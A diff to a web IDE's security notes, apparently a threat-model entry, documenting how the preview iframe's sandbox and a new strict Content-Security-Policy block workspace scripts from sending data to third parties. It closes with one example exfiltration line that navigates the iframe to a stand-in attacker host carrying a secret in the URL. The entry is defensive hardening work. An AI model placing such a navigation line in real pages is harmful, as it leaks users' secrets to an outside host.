@@ -83,16 +83,22 @@ requires a manual `kill`/`taskkill`. See
   send `Referrer-Policy: no-referrer` to limit Referer leakage.
 
 - **sec-preview-same-origin-scripts (Medium — mitigated 2026-07-18, CSP
-  reconciled 2026-07-26):** Browse preview iframe uses `sandbox="allow-scripts"`
-  (no `allow-same-origin`) so workspace JS runs with an opaque origin and cannot
-  read IDE `localStorage`/cookies or call authenticated `/api/*` as the IDE.
-  `/preview` responses set `frame-ancestors 'self'; sandbox allow-scripts` —
-  `allow-scripts` (not `allow-same-origin`) is chosen so the iframe sandbox and
-  CSP sandbox combine into "scripts run, opaque origin" (union of restrictions),
-  which both keeps script-driven static-site previews working AND blocks
-  direct-navigation XSS (a user clicking a `/preview/{id}/evil.html` link
-  outside any iframe still gets an opaque origin). `/raw` (direct-access only,
-  no frontend iframe) keeps the stricter `sandbox allow-same-origin` (no
+  reconciled 2026-07-26, exfil closed 2026-07-26):** Browse preview iframe uses
+  `sandbox="allow-scripts"` (no `allow-same-origin`) so workspace JS runs with
+  an opaque origin and cannot read IDE `localStorage`/cookies or call
+  authenticated `/api/*` as the IDE. `/preview` responses set a comprehensive
+  CSP: `frame-ancestors 'self'; sandbox allow-scripts; default-src 'none';
+  script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src
+  'self' data: blob:; font-src 'self' data:; media-src 'self' blob:;
+  connect-src 'none'; frame-src 'none'; object-src 'none'; form-action 'none';
+  base-uri 'none'`. `default-src 'none'` + per-type `'self'` allows closes the
+  third-party exfiltration residual: workspace JS can no longer
+  `fetch()`/`sendBeacon()`/WebSocket outbound, nor load cross-origin
+  `<img>`/`<script>`/`<link>`/`<video>`/`<iframe>`/`<object>`/`<font>` resources
+  that could smuggle data in URL query strings. `'self'` matches the response
+  URL's origin (CSP3 §2.2.2), not the sandboxed opaque origin, so relative
+  subresources from `/preview/{id}/` still load. `/raw` (direct-access only, no
+  frontend iframe) keeps the stricter `sandbox allow-same-origin` (no
   `allow-scripts`) so agent-written HTML opened via `/raw` cannot execute
   scripts at all. Relative assets resolve correctly on loopback, where auth is
   bypassed, but a LAN browser does not propagate the entry URL's query
@@ -100,4 +106,7 @@ requires a manual `kill`/`taskkill`. See
   workspace-scoped in-memory ticket exchanged for an HttpOnly, path-scoped
   cookie. The residual risk is exposure of that short-lived ticket in the entry
   URL/server logs; `Referrer-Policy: no-referrer` limits onward Referer leakage.
-  Workspace JS can still exfiltrate via third-party requests.
+  The only remaining exfil channel is iframe self-navigation
+  (`window.location = 'https://evil.com/?secret'`), which is GET-only,
+  URL-length-limited, and visually visible to the user; CSP cannot block
+  self-navigation of a sandboxed iframe.
